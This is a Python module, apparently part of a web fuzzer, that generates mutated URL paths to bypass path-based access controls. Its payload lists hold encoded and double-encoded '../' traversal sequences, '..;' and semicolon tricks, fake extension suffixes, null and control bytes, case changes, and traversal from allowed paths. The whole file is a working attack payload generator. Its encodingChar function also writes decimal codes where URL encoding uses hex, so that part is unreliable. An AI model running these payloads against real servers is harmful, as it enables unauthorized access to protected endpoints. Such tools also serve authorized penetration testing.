from utils import  findAllCharIndexesInString
from utils import  generatedotdotSlash,generatedotdotSlashEncoded

# /a/b/./c
def insertBetweenSlashes(path):
    payloads = '''
%2e
..;
.
;
..
'''
    payloads = list(filter(None,payloads.split('\n')))

    newpaths = set()

    for payload in payloads:
        for i in findAllCharIndexesInString(path, "/"):
            newpath = path[:i] + "/" + payload + "/" + path[i + 1:]
            newpaths.add(newpath)

    return newpaths



def lastShowTwice(path):
    payloads = '''
%2f..%2f
/../
%2f%2e%2e%2f
%2f.%2e%2f
'''
    payloads = list(filter(None,payloads.split('\n')))
    index = findAllCharIndexesInString(path,'/')
    last_element = path[index[len(index)-1]+1:]
    newpaths = set()
    for payload in payloads:
        newpath = path + payload + last_element
        newpaths.add(newpath)

    return newpaths


#  /a/b/c   /a..;/b/c
def insertBeforeSlash(path):
    payloads = '''
..
..;
/
'''
    payloads = list(filter(None,payloads.split('\n')))

    newpaths = set()

    for payload in payloads:
        for i in findAllCharIndexesInString(path, "/"):
            newpath =  path[:i] + payload + path[i:]
            newpaths.add(newpath)

    return newpaths


    # /index.php/admin/dsd/sdsds
def addPrefix(path):
    payloads = '''
/index.php
/%2e
/;
/#/..
/..
/../..
/../../..
'''
    payloads = list(filter(None,payloads.split('\n')))
    newpaths = set()

    for payload in payloads:
        newpath = payload + path
        newpaths.add(newpath)

    return newpaths




def appendBackfix(path):
    payloads = '''
%2ejsp%3b.png
%2ephp%3b.jpg
%2easp%3b.png
%2easp%3b.png
%2epng
%2ewoff
%2ecss
%3f.gif
%3f.css
%3f.png
.json
/./
/
.css
.html
..;/
/..;/
?test
#
#test
/.
/.dasdas
%20
%09
%00
%03
%08
%10
%83
?
//../
/../
@google.com
'''
    payloads = list(filter(None,payloads.split('\n')))
    newpaths = set()
    for payload in payloads:
        newpaths.add(path+payload)
    return newpaths


#okpath : /a  /a/b  /a/b/c
def traversalFromOkPath(path,okpaths):
    payloads = '''..
%2e%2e
..;
%252e%252e
.%2e'''
    payloads = list(filter(None,payloads.split('\n')))

    newpaths  = set()

    for okpath in okpaths:
        slash_count = len(findAllCharIndexesInString(okpath, '/'))

        for payload in payloads:
            newpath = okpath  + generatedotdotSlash(slash_count,payload) + path
            newpath_1 = okpath  + generatedotdotSlashEncoded(slash_count,payload) + path
            newpaths.add(newpath)
            newpaths.add(newpath_1)
    print(newpaths)
    return newpaths

def traversalFromOkpath2(basePath,okpaths):
    payloads = '''..
%2e%2e
..;
%252e%252e
.%2e'''
    payloads = list(filter(None,payloads.split('\n')))

    newpaths  = set()

    for okpath in okpaths:
        for payload in payloads:
            for i in range(1,5):
                fuzz_str = (payload + '/')*i

                newpath = okpath +fuzz_str + basePath.lstrip('/')
                newpaths.add(newpath)
    return newpaths


#uppercase the first char after slash
def uppercaseChar(path):
    newpaths =set()
    for i in findAllCharIndexesInString(path, "/"):
        pathWithPayload = path[:i+1] + path[i+1].upper() +  path[i + 2:]
        newpaths.add(pathWithPayload)
    return newpaths


def encodingChar(path):
    newpaths =set()
    for i in findAllCharIndexesInString(path, "/"):
        pathWithPayload = path[:i+1] + "%" + str(ord(path[i+1])) +  path[i+2:]
        newpaths.add(pathWithPayload)
    return newpaths

def processPath(path,okpaths):
    if not path.startswith("/"):
        path = "/" + path
    if path.endswith("/") and path != "/":
        path = path.rstrip("/")

    payload_paths = set()
    payload_paths.update(uppercaseChar(path),
                                         encodingChar(path),
                                         appendBackfix(path),
                                         addPrefix(path),
                                         insertBetweenSlashes(path),
                                         insertBeforeSlash(path),
                                         lastShowTwice(path))

    if okpaths:
        payload_paths.update(traversalFromOkPath(path, okpaths))
        payload_paths.update(traversalFromOkpath2(path, okpaths))

    return payload_paths

